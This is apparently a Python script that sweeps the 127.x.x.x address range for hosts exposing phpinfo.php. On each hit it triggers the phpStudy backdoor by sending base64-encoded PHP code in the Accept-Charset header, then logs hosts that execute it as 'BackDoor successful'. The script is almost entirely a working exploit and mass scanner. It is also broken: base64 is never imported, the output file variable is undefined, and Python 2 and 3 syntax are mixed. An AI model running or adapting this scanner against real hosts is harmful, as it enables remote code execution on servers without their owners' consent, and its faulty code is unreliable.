import requests
url='127.'

def check(ip):
    test_url='http://'+str(ip)+'/phpinfo.php'
    try:
        scan_ip=requests.head(test_url,timeout=0.3,allow_redirects=False)
        if scan_ip.status_code==200:
            return True
    except Exception:
        pass

def check_phpstudy(url):
    payload = "echo md5(123);"

    payload = base64.b64encode(payload.encode('utf-8'))

    headers = {

    'Upgrade-Insecure-Requests': '1',

    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36',

    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',

    'Accept-Language': 'zh-CN,zh;q=0.9',

    'accept-charset': payload,

    'Accept-Encoding': 'gzip,deflate',

    'Connection': 'close',

}
    try:

        r = requests.get(url=url+'/index.php', headers=headers, verify=False,timeout=10)

        if "202cb962ac59075b964b07152d234b70" in r.text:

            print ('[ + ] BackDoor successful: '+url+'===============[ + ]\n')

            with open(files+'.success.txt','a') as f:

                    f.write(url+'\n')

        else:

            print ('[ - ] BackDoor failed: '+url+'[ - ]\n')

    except:

        print ('[ - ] Timeout: '+url+' [ - ]\n')
        
    
def main():
    for i in range(1,255):
        for j in range(1,255):
            for k in range(1,255):
                new_url=url+str(i)+'.'+str(j)+'.'+str(k)
                print new_url
                if check(new_url):
                    check_phpstudy(new_url)
                    
                        
if __name__=='__main__':
    main()
